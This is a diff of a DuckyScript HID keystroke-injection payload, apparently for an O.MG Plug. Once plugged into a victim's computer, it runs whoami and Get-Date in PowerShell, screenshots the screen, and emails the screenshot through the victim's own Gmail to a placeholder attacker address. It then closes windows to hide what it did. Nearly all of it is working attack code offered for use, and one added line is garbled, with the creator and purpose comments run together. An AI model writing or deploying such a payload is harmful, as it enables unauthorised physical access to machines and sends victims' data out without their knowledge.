@@ -23,16 +23,14 @@ REM            ,kNMMMMMMNKOkxkkOKWMMMMMMNx.
 REM             .:kNMMMMMMMMMMMMMMMMMMXx;        
 REM               .,lkKWMMMMMMMMMMNKxc'          
 REM                   'cdOKXXXX0kd:.             
-⠀⠀⠀⠀⠀⠀⠀⠀
+
 REM Proof of entry 2.0, wireless, and multiple methods.
 
-REM Version 0.2 (THIS IS AN UNRELEASED VERSION OF PoBV2, USE WITH CAUTION!)
+REM Version 0.3 (THIS IS AN UNRELEASED VERSION OF PoBV2, USE WITH CAUTION!)
 
 REM Devices: Optimised for O.MG Plug, with tweaks could be ran on most HID devices as a payload.
 
-REM Creator: Sleep. (u/sl66pbtw on reddit, Sl66p on github.)
-
-REM Purpose of script: Provides a text box that shows logged in user's username and time
+REM Creator: Sleep. (u/sl66pbtwEM Purpose of script: Provides a text box that shows logged in user's username and time
 
 REM Disclaimer! I AM NOT LIABLE IN ANY FORM FOR HARM DONE TO A SYSTEM (even though this script is virtually harmless) Disclaimer!
 
@@ -46,23 +44,25 @@ DELAY 500
 STRING Powershell
 DELAY 200
 ENTER
-DELAY 500
+DELAY 200
+WINDOWS UP
+DELAY 200
 STRING whoami
 ENTER
-DELAY 500
+DELAY 200
 STRING Get-Date
 ENTER
 DELAY 1000
 
 REM Take screenshot
 SHIFT WINDOWS S
-DELAY 1000
+DELAY 500
 TAB
 TAB
 TAB
 TAB
 ENTER
-DELAY 1000
+DELAY 500
 WINDOWS d
 DELAY 500
 
@@ -75,11 +75,9 @@ REM "START USE TARGET EMAIL"
 
 REM Opens Gmail
 GUI r
-DELAY 1000
-STRING chrome.exe https://mail.google.com/mail/u/0/#inbox?compose=new
-REM    ^^^^^ Change this based on targets browser, msedge.exe for edge, firefox.exe for ff, etc. if youre not sure of the exe
-REM          find someone who has the browser, right click, open file location :))
-DELAY 1000
+DELAY 500
+STRING https://mail.google.com/mail/u/0/#inbox?compose=new
+DELAY 500
 ENTER
 
 REM Typing email
@@ -87,7 +85,7 @@ DELAY 5000
 STRING youremailhere@domain.com
 REM ^^^ This is the email that will recieve the screenshot ^^^
 ENTER
-DELAY 1000
+DELAY 500
 TAB
 STRING Sleep Was Here!
 DELAY 500
@@ -96,13 +94,13 @@ STRING Hi! Sleepy here, we got em.
 DELAY 500
 ENTER
 STRING Hack the WRLD!
-DELAY 1000
+DELAY 500
 
 REM Pastes screenshot
 SHIFT INSERT
 
 REM Waits for image to upload (adjust accoordingly)
-DELAY 10000
+DELAY 5000
 
 REM Sends email
 TAB
@@ -112,7 +110,7 @@ REM "END USE TARGET EMAIL"
 
 REM Lets do some cleanup
 ALT F4
-DELAY 350
+DELAY 200
 ALT TAB
-DELAY 350
+DELAY 200
 ALT F4
